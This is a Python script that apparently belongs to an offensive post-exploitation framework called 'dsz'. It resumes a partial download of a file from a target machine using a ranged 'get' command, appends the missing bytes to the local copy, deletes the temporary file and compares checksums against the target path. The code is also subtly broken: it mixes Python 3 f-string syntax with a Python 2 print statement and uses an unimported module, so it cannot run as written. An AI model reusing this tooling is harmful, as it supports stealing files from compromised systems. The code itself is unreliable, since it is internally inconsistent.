
import dsz
import dsz.lp
import dsz.file
import os, sys, stat

def main():
    usage()
    localFile = str(raw_input('Enter partial file: '))
    if (not os.path.exists(localFile)):
        safePrint('Local file does not exist...')
        return True
    getFile = str(raw_input('Enter path of file to get: '))
    dirCmd = f'dir {getFile}'
    if dsz.cmd.Run(dirCmd, dsz.RUN_FLAG_RECORD):
        size = ''
        try:
            dsz.cmd.data.Get('diritem::fileitem::name', dsz.TYPE_STRING)
            [size] = dsz.cmd.data.Get('diritem::fileitem::size', dsz.TYPE_INT)
            [targetPath] = dsz.cmd.data.Get('diritem::path', dsz.TYPE_STRING)
        except:
            safePrint('Could not find file')
            return True
        size = int(size)
        safePrint('File Exists...Starting SYNC\n')
        getCmd = makeGetCmd(localFile, getFile, size)
        if (not getCmd):
            safePrint('Exiting...')
            return False
        if dsz.cmd.Run(getCmd, dsz.RUN_FLAG_RECORD):
            [tmpName] = dsz.cmd.data.Get('FileLocalName::localname', dsz.TYPE_STRING)
            combine(localFile, tmpName)
            return bool(checksum(localFile, getFile, targetPath))
        else:
            safePrint('Error getting file...')
    return True

def checksum(localFile, targetFile, targetPath):
    safePrint('Comparing hashes')
    localPath = str(dsz.lp.GetLogsDirectory()).strip()
    checksum_cmd = ('checksum %s %s\\GetFiles %s %s' % (localFile.split('\\')[(-1)], localPath, targetFile.split('\\')[(-1)], targetPath))
    if dsz.cmd.Run(checksum_cmd, dsz.RUN_FLAG_RECORD):
        safePrint('Hashes match!')
        return True
    else:
        safePrint('Hash mismatch')
        return False

def combine(localFile, tmpFile):
    tmpFile = os.path.join(('%s\\GetFiles' % str(dsz.lp.GetLogsDirectory()).strip()), tmpFile)
    safePrint('Making file writeable')
    os.chmod(localFile, stat.S_IWRITE)
    with open(localFile, 'ab') as f1:
        localSize = int(os.stat(localFile).st_size)
        safePrint(('Local File Size is %d Bytes' % localSize))
        with open(tmpFile, 'rb') as f2:
            tmpData = f2.read()
        f1.write(tmpData)
        tmpData = ''
    os.chmod(localFile, stat.S_IREAD)
    os.chmod(tmpFile, stat.S_IWRITE)
    os.remove(tmpFile)
    safePrint('\n## File has been combined successfully! ##')
    return True

def makeGetCmd(localFile, getFile, size):
    localSize = int(os.stat(localFile).st_size)
    if (size == localSize):
        safePrint('File sizes are the same...returning')
        return False
    data = ''
    return ('get %s -range %d -name tmpget' % (getFile, localSize))

def usage():
    safePrint('Usage: python windows\\get_sync.py')

def safePrint(strInput):
    print strInput.encode('utf8')
if (__name__ == '__main__'):
    main()